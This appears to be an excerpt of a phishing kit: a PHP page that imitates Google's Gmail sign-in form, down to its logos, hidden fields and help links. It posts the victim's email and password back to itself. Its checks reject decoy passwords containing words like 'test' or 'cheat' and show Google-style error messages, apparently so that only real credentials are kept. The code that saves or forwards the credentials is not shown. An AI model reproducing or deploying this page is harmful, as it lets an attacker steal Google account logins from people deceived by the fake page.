...
if($_POST) {
	...
	if(strlen($email) <= 4) {
		$email_msg = "The username you entered is incorrect.";
	} 
        else if(trim($pass) == "") {
		$pass_msg = "Enter your password.";
	}
        else if(strlen($pass) <= 5 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "The password you entered is incorrect.";
	}
   else {
...
<style>
  ...
  <link href="simple_files/css.css" rel="stylesheet" type="text/css">
<style>
  .banner {
  text-align: center;
  }
...
<style>
  ...
  <img alt="Google" class="logo" src="simple_files/logo_2x.png">
  </div>
  </div>
...
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"><iframe id="youtube" src="simple_files/CheckConnection.html" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<img class="profile-img" src="simple_files/avatar_2x.png" alt="">
<p class="profile-name"></p>
  <form novalidate="" method="post" action="" id="gaia_loginform">
  <input name="GALX" value="UKE63T7S36Y" type="hidden">
  <input name="continue" value="https://mail.google.com/mail/?ui=2" type="hidden">
  ...
  <input id="checkConnection" name="checkConnection" value="youtube:271:1" type="hidden">
  <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
<label class="hidden-label" for="Email">Email</label>

<?php if($user == "") { ?>
	
	<input value="<?php echo $email != "" ? $email : "" ?>" id="Email" name="email" placeholder="Email" spellcheck="false" class="" type="email"><?php $email_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 2px;'>$email_msg</span>" : "" ?>
<?php echo $email_msg != "" ? "<span style='color: #dd4b39; display: block; margin: .5em 0 0;'>$email_msg</span>" : "<br />" ?><br /><br />
...
min-height: 16px;
text-align: center;"
><p id='username'><b><?php echo $user ?></b></p> </span>
  ...
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;"> <?php echo $userid ?></span>
...
<input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Sign in" type="submit">
  ...
  <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3D2" class="need-help-reverse">
  Need help?
  </a>
  </form>
</div>
<div class="one-google">
  ...
  <a id="link-signup" href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3D2&amp;hl=en">
  Create an account
  </a>
  </p>
<p class="tagline">
...
<img src="simple_files/logo_strip_2x.png" alt="" height="17" width="210">
</div>
  </div>
  ...
  <li>
  <a href="https://accounts.google.com/TOS?loc=NG&amp;hl=en" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  ...
  <label for="lang-chooser"><img src="simple_files/universal_language_settings-21.png" alt="Change language"></label>
...
Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].m()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Go.a("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Go.i(Gv);G_setPostMessageSupportFlag=Go.i(Gw);
  ...
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-1804730881',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  ...
  <script type="text/javascript">
  document.bg = new botguard.bg('');
  </script>
<script>
